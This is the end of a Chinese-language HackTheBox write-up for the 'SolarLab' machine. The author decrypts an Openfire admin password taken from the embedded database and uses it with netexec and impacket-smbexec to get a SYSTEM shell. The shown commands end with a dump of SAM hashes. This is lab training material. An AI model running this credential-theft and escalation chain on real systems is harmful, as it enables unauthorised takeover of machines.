+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; <span class="built_in">whoami</span></span><br><span class="line">solarlab\openfire</span><br><span class="line"></span><br><span class="line">PS C:\mane&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name          Description              State</span><br><span class="line">======================= ======================== =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects    Enabled</span><br></pre></td></tr></table></figure>
+
+<p>winpeas 枚舉了一下，什麽都沒有。 不過想起了另一個 <code>admin</code>​ 用戶，嘗試看看數據庫裏面有沒有密碼，hash之類的，查了一下數據庫的路徑：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512182348-0hzzlnr.png" alt="image">​</p>
+<p>不過在這裏也可以看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512182445-0obj6kf.png" alt="image">​</p>
+<p>‍</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users&gt; <span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Openfire\embedded-db&quot;</span>      </span><br><span class="line">PS C:\Program Files\Openfire\embedded-db&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Openfire\embedded-db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         5/11/2024  10:01 PM                openfire.tmp</span><br><span class="line">-a----         5/12/2024   1:10 AM             16 openfire.lck</span><br><span class="line">-a----         5/12/2024   1:16 PM           4282 openfire.log</span><br><span class="line">-a----         5/11/2024  10:01 PM            106 openfire.properties</span><br><span class="line">-a----          5/7/2024   9:53 PM          16161 openfire.script</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Program Files\Openfire\embedded-db&gt; <span class="built_in">type</span> openfire.script</span><br><span class="line">.....</span><br><span class="line">CREATE USER SA PASSWORD DIGEST <span class="string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span></span><br><span class="line">.....</span><br><span class="line">CREATE MEMORY TABLE PUBLIC.OFROSTER(ROSTERID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,JID VARCHAR(1024) NOT NULL,SUB INTEGER NOT NULL,ASK INTEGER NOT NULL,RECV INTEGER NOT NULL,NICK VA</span><br><span class="line">.....</span><br><span class="line">INSERT INTO OFUSER VALUES(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;</span>,<span class="string">&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;</span>,<span class="string">&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;</span>,4096,NULL,<span class="string">&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062</span></span><br><span class="line"><span class="string">e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;</span>,<span class="string">&#x27;Administrator&#x27;</span>,<span class="string">&#x27;admin@solarlab.htb&#x27;</span>,<span class="string">&#x27;001700223740785&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">.....</span><br><span class="line">INSERT INTO OFPROPERTY VALUES(<span class="string">&#x27;passwordKey&#x27;</span>,<span class="string">&#x27;hGXiFzsKaAeYLjn&#x27;</span>,0,NULL)</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">PS C:\Program Files\Openfire\embedded-db&gt; </span><br></pre></td></tr></table></figure>
+
+<p>問題是如何解密或者如何dump hash呢？</p>
+<p>繼續搜索了一下，找到了一個項目：</p>
+<blockquote>
+<p>where $enc_password - encrypted password from table [ofUser] column [encryptedPassword],</p>
+<p>$blowfish_key - blowfish key table [ofProperty] column [propValue] where [name]&#x3D;’passwordKey’</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shakaw/openfire-password-decrypt">https://github.com/shakaw/openfire-password-decrypt</a></p>
+</blockquote>
+<p>然後看了一下php的源碼，確實是需要這兩個，根據提示，整理了一下上面的數據庫，得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USERNAME,STOREDKEY,SERVERKEY,SALT,ITERATIONS,PLAINPASSWORD,ENCRYPTEDPASS</span><br><span class="line">admin,gjMoswpK+HakPdvLIvp6eLKlYh0=,9MwNQcJ9bF4YeyZDdns5gvXp620=,yidQk5Skw11QJWTBAloAb28lYHftqa0x,4096,NULL,becb0c67cfec25aa266ae077e18177c5c3308e2255db062</span><br></pre></td></tr></table></figure>
+
+<p>所以得到： <code>$enc_password = becb0c67cfec25aa266ae077e18177c5c3308e2255db062</code>​ 和 <code>$blowfish_key = hGXiFzsKaAeYLjn</code>​</p>
+<p>但是這個php源碼沒辦法運行，因爲缺少了一些模塊，所以繼續看看有沒有其他的工具，看到了這個：<a target="_blank" rel="noopener" href="https://github.com/c0rdis/openfire_decrypt">https://github.com/c0rdis/openfire_decrypt</a></p>
+<p>然後根據提示，編譯好之後運行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/c0rdis/openfire_decrypt </span><br><span class="line">Cloning into <span class="string">&#x27;openfire_decrypt&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 15, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15</span><br><span class="line">Receiving objects: 100% (15/15), <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">$ <span class="built_in">cd</span> openfire_decrypt </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">OpenFireDecryptPass.java  README.md</span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">$ javac OpenFireDecryptPass.java </span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>ThisPasswordShouldDo!@</code>​ 密碼，所以就試試看是不是<code>administrator</code>​的密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.231.39 -u <span class="string">&#x27;administrator&#x27;</span> -p <span class="string">&#x27;ThisPasswordShouldDo!@&#x27;</span> </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [+] solarlab\administrator:ThisPasswordShouldDo!@ (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<p>然後就可以smbexec一下了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbexec administrator:<span class="string">&#x27;ThisPasswordShouldDo!@&#x27;</span>@10.129.231.39</span><br><span class="line">Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.231.39 -u <span class="string">&#x27;administrator&#x27;</span> -p <span class="string">&#x27;ThisPasswordShouldDo!@&#x27;</span> --sam</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [+] solarlab\administrator:ThisPasswordShouldDo!@ (Pwn3d!)</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [*] Dumping SAM hashes</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c032ae85d6995c0bb4999ec869d90cf:::</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:57da9863751e0fd175f042bc41aec9b2:::</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         blake:1000:aad3b435b51404eeaad3b435b51404ee:4cf570cdca082077b0e61addac8b7705:::</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         openfire:1001:aad3b435b51404eeaad3b435b51404ee:a22c1b83fa00c6030969caf37a5e061b:::</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [+] Added 6 SAM hashes to the database</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#109;&#x61;&#x6e;&#101;&#64;&#109;&#x61;&#x6e;&#101;&#x73;&#x65;&#x63;&#x2e;&#99;&#111;&#109;">&#109;&#x61;&#x6e;&#101;&#64;&#109;&#x61;&#x6e;&#101;&#x73;&#x65;&#x63;&#x2e;&#99;&#111;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#x6d;&#x61;&#x6e;&#x65;&#x40;&#x6d;&#97;&#x6e;&#101;&#x73;&#101;&#99;&#x2e;&#99;&#x6f;&#109;">&#x6d;&#x61;&#x6e;&#x65;&#x40;&#x6d;&#97;&#x6e;&#101;&#x73;&#101;&#99;&#x2e;&#99;&#x6f;&#109;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&text=HackTheBox - Machine - SolarLab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&is_video=false&description=HackTheBox - Machine - SolarLab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - SolarLab&body=Check out this article: https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&name=HackTheBox - Machine - SolarLab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&t=HackTheBox - Machine - SolarLab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
